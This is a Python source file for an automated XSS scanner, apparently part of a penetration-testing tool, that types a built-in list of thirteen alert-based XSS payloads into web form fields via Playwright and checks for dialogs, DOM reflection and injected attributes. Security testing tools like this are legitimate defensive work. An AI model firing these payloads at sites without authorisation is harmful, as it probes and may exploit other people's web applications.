"""
XSS Detector - Test web forms for Cross-Site Scripting vulnerabilities.

Ported from browser-mcp TypeScript xss-detector.ts.

Provides:
- Multiple detection methods: dialog, DOM reflection, console output, attribute injection
- Default payload set covering common XSS vectors
- Per-field and per-payload testing with result tracking
"""

from __future__ import annotations

import asyncio
import logging
import re
import uuid
from typing import Any, Dict, List, Optional

logger = logging.getLogger("autopentest-mcp")


# ---------------------------------------------------------------------------
# Default XSS payloads
# ---------------------------------------------------------------------------

_DEFAULT_PAYLOADS: List[str] = [
    # Basic script injection
    '<script>alert("XSS")</script>',
    # Event handler injection
    '<img src=x onerror=alert("XSS")>',
    # SVG injection
    '<svg onload=alert("XSS")>',
    # Body onload
    '<body onload=alert("XSS")>',
    # IMG with javascript: URI
    '<img src="javascript:alert(\'XSS\')">',
    # Anchor with javascript:
    '<a href="javascript:alert(\'XSS\')">click</a>',
    # Input autofocus onfocus
    '<input autofocus onfocus=alert("XSS")>',
    # Details/summary
    '<details open ontoggle=alert("XSS")>',
    # Iframe injection
    '<iframe src="javascript:alert(\'XSS\')">',
    # Double encoding
    '%3Cscript%3Ealert("XSS")%3C/script%3E',
    # Single-quote break out of attribute
    "' onmouseover='alert(\"XSS\")",
    # Double-quote break out of attribute
    '" onmouseover="alert(\'XSS\')"',
    # Template literal injection
    '${alert("XSS")}',
]


class XSSDetector:
    """Test web pages for XSS vulnerabilities using Playwright.

    Detection methods:
    - **Dialog detection**: Listens for alert/confirm/prompt dialogs.
    - **DOM reflection**: Checks if the payload appears unescaped in the DOM.
    - **Console output**: Monitors console messages for marker strings.
    - **Attribute injection**: Checks if event handler attributes were injected.
    """

    def __init__(self, marker: Optional[str] = None) -> None:
        self._marker = marker or f"xss-{uuid.uuid4().hex[:8]}"
        self._dialog_detected = False
        self._dialog_message: Optional[str] = None
        self._console_messages: List[str] = []

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def get_default_payloads(self) -> List[str]:
        """Return the list of 13 default XSS payloads."""
        return list(_DEFAULT_PAYLOADS)

    def was_dialog_detected(self) -> bool:
        """Return True if a dialog (alert/confirm/prompt) was detected."""
        return self._dialog_detected

    def reset(self) -> None:
        """Reset detection state for a new test run."""
        self._dialog_detected = False
        self._dialog_message = None
        self._console_messages.clear()

    async def setup_listeners(self, page: Any) -> None:
        """Set up dialog and console listeners on a Playwright page.

        Must be called before testing payloads.
        """
        async def _on_dialog(dialog: Any) -> None:
            self._dialog_detected = True
            self._dialog_message = dialog.message
            try:
                await dialog.dismiss()
            except Exception:
                pass

        def _on_console(msg: Any) -> None:
            self._console_messages.append(str(msg.text))

        page.on("dialog", _on_dialog)
        page.on("console", _on_console)

    async def test_payload(
        self,
        page: Any,
        field_selector: str,
        payload: str,
        submit_selector: Optional[str] = None,
    ) -> Optional[Dict[str, Any]]:
        """Test a single XSS payload against a field.

        Parameters
        ----------
        page : playwright Page
            The Playwright page object.
        field_selector : str
            CSS selector for the input field.
        payload : str
            XSS payload string to inject.
        submit_selector : str, optional
            CSS selector for a submit button. If provided, the form is
            submitted after injecting the payload.

        Returns
        -------
        dict or None
            Finding dict if XSS was detected, otherwise None.
        """
        # Reset per-payload state
        self._dialog_detected = False
        self._dialog_message = None
        pre_console_count = len(self._console_messages)

        try:
            # Clear the field and type the payload
            await page.fill(field_selector, "")
            await page.fill(field_selector, payload)

            # Submit if a submit selector is provided
            if submit_selector:
                await page.click(submit_selector)
                # Wait for potential navigation / DOM update
                await asyncio.sleep(0.5)
            else:
                # Try pressing Enter as fallback
                await page.press(field_selector, "Enter")
                await asyncio.sleep(0.5)

            # --- Detection checks ---
            detection_methods: List[str] = []
            evidence: Dict[str, Any] = {
                "payload": payload,
                "field_selector": field_selector,
            }

            # 1. Dialog detection
            if self._dialog_detected:
                detection_methods.append("dialog")
                evidence["dialog_message"] = self._dialog_message

            # 2. DOM reflection detection
            dom_reflected = await self._check_dom_reflection(page, payload)
            if dom_reflected:
                detection_methods.append("dom_reflection")
                evidence["dom_reflection"] = True

            # 3. Console output detection
            new_console = self._console_messages[pre_console_count:]
            if new_console:
                # Check if any console messages could indicate XSS execution
                for msg in new_console:
                    if "XSS" in msg or self._marker in msg:
                        detection_methods.append("console_output")
                        evidence["console_messages"] = new_console
                        break

            # 4. Attribute injection detection
            attr_injected = await self._check_attribute_injection(page, payload)
            if attr_injected:
                detection_methods.append("attribute_injection")
                evidence["attribute_injection"] = True

            if detection_methods:
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "field_selector": field_selector,
                    "detection_methods": detection_methods,
                    "evidence": evidence,
                    "severity": self._classify_severity(detection_methods),
                }

            return None

        except Exception as exc:
            logger.debug(
                "XSS test error for payload on %s: %s",
                field_selector,
                str(exc),
            )
            return None

    async def test_field(
        self,
        page: Any,
        field_name: str,
        field_selector: str,
        payloads: Optional[List[str]] = None,
        submit_selector: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """Test all payloads on a single field.

        Parameters
        ----------
        page : playwright Page
            The Playwright page object.
        field_name : str
            Human-readable field name.
        field_selector : str
            CSS selector for the field.
        payloads : list of str, optional
            Payloads to test. Defaults to the built-in payload set.
        submit_selector : str, optional
            CSS selector for submit button.

        Returns
        -------
        list of dict
            List of findings (each a dict with vulnerability details).
        """
        if payloads is None:
            payloads = self.get_default_payloads()

        findings: List[Dict[str, Any]] = []

        for payload in payloads:
            result = await self.test_payload(
                page, field_selector, payload, submit_selector
            )
            if result:
                result["field_name"] = field_name
                findings.append(result)
                logger.info(
                    "XSS found in field '%s' with payload: %s",
                    field_name,
                    payload[:60],
                )

        return findings

    # ------------------------------------------------------------------
    # Detection helpers
    # ------------------------------------------------------------------

    async def _check_dom_reflection(self, page: Any, payload: str) -> bool:
        """Check if the payload is reflected unescaped in the page DOM."""
        try:
            page_content = await page.content()

            # Check for exact payload reflection (unescaped)
            if payload in page_content:
                return True

            # Check for key dangerous patterns from the payload
            # Strip outer tags and check for the inner content
            dangerous_patterns = [
                "onerror=", "onload=", "onfocus=", "onmouseover=",
                "ontoggle=", "javascript:", "<script>",
            ]
            for pattern in dangerous_patterns:
                if pattern in payload.lower() and pattern in page_content.lower():
                    # Verify it's actually from our payload, not pre-existing
                    # by checking surrounding context
                    return True

            return False
        except Exception:
            return False

    async def _check_attribute_injection(self, page: Any, payload: str) -> bool:
        """Check if event handler attributes were injected into the DOM."""
        try:
            # Look for common injected event handlers
            event_handlers = [
                "onerror", "onload", "onfocus", "onmouseover",
                "ontoggle", "onclick", "onmouseenter",
            ]

            for handler in event_handlers:
                if handler not in payload.lower():
                    continue

                # Check if any element has this handler as an attribute
                result = await page.evaluate("""(handler) => {
                    const all = document.querySelectorAll('*');
                    for (const el of all) {
                        if (el.hasAttribute(handler)) {
                            return true;
                        }
                    }
                    return false;
                }""", handler)

                if result:
                    return True

            return False
        except Exception:
            return False

    @staticmethod
    def _classify_severity(detection_methods: List[str]) -> str:
        """Classify XSS severity based on detection methods.

        Returns 'HIGH', 'MEDIUM', or 'LOW'.
        """
        if "dialog" in detection_methods:
            return "HIGH"
        if "console_output" in detection_methods:
            return "HIGH"
        if "attribute_injection" in detection_methods:
            return "MEDIUM"
        if "dom_reflection" in detection_methods:
            return "MEDIUM"
        return "LOW"
